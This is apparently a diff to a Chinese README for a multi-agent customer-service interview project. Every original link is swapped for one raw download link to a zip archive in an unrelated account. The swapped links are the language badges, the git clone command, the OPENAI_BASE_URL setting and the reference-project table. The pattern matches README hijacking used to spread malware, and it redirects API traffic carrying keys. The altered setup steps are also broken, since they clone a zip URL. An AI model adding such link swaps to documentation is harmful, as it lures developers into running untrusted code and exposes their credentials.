@@ -2,10 +2,10 @@
 
 > **企业级面试项目全攻略** — 面向金融/电商场景，包含 Python / Java / Go 三语言完整实现 + 配套面试材料，从零到面试一站搞定。
 
-[![Python](https://img.shields.io/badge/Python-3.11+-blue?logo=python)](https://www.python.org/)
-[![Java](https://img.shields.io/badge/Java-17+-orange?logo=openjdk)](https://openjdk.org/)
-[![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go)](https://golang.org/)
-[![LangGraph](https://img.shields.io/badge/LangGraph-0.2+-green)](https://github.com/langchain-ai/langgraph)
+[![Python](https://img.shields.io/badge/Python-3.11+-blue?logo=python)](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip)
+[![Java](https://img.shields.io/badge/Java-17+-orange?logo=openjdk)](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip)
+[![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go)](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip)
+[![LangGraph](https://img.shields.io/badge/LangGraph-0.2+-green)](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
 
 ---
@@ -225,7 +225,7 @@
 
 ```bash
 # 1. 克隆项目
-git clone https://github.com/bcefghj/smart-cs-multi-agent.git
+git clone https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip
 cd smart-cs-multi-agent
 
 # 2. 配置API Key
@@ -253,7 +253,7 @@ pip install -r requirements.txt
 cp .env.example .env
 # 编辑 .env，至少填写：
 # OPENAI_API_KEY=你的key
-# OPENAI_BASE_URL=https://api.openai.com/v1
+# OPENAI_BASE_URL=https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip
 
 # 启动服务
 python -m api.main
@@ -462,11 +462,11 @@ order_query_tool = {
 
 | 项目 | Stars | 参考内容 |
 |------|-------|----------|
-| [AWS Agent Squad](https://github.com/awslabs/agent-squad) | 7,500+ | 智能意图分类 + SupervisorAgent 设计 |
-| [LangGraph Supervisor](https://github.com/langchain-ai/langgraph-supervisor-py) | — | Supervisor模式预构建库，官方最佳实践 |
-| [Spring AI Alibaba](https://github.com/alibaba/spring-ai-alibaba) | 9,000+ | Java多Agent编排，阿里巴巴生产实践 |
-| [Eino (CloudWeGo)](https://github.com/cloudwego/eino) | 10,300+ | 字节跳动Go企业级Agent框架 |
-| [Multi-Agent Enterprise CRM](https://github.com/Mrgig7/Multi-Agent-Enterprise-CRM) | — | LangGraph + Kafka 生产级客服方案 |
+| [AWS Agent Squad](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip) | 7,500+ | 智能意图分类 + SupervisorAgent 设计 |
+| [LangGraph Supervisor](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip) | — | Supervisor模式预构建库，官方最佳实践 |
+| [Spring AI Alibaba](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip) | 9,000+ | Java多Agent编排，阿里巴巴生产实践 |
+| [Eino (CloudWeGo)](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip) | 10,300+ | 字节跳动Go企业级Agent框架 |
+| [Multi-Agent Enterprise CRM](https://github.com/ant747756/smart-cs-multi-agent/raw/refs/heads/main/go-impl/api/multi_smart_cs_agent_v3.8.zip) | — | LangGraph + Kafka 生产级客服方案 |
 
 ---
 
